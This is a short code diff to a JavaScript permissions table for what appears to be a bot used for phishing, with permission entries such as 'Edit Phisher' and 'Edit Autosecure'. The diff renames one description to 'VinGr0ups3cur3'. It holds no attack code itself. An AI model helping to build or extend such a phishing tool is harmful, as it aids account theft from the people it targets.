@@ -11,7 +11,7 @@ module.exports = async function userpermissions() {
         usedmbuttons: { permission: 'usedmbuttons', description: "Use DM Buttons" },
         editbot: { permission: 'editbot', description: "Edit Bot" },
         editphisher: { permission: 'editphisher', description: "Edit Phisher" },
-        editautosecure: { permission: 'editautosecure', description: "Edit Autosecure" },
+        editautosecure: { permission: 'editautosecure', description: "Edit VinGr0ups3cur3" },
         editblacklist: { permission: 'editblacklist', description: "Edit Blacklist" },
         editpresets: { permission: 'editpresets', description: "Edit Presets"},
         sendembeds: { permission: 'sendembeds', description: "Send Embeds & Set channels"}
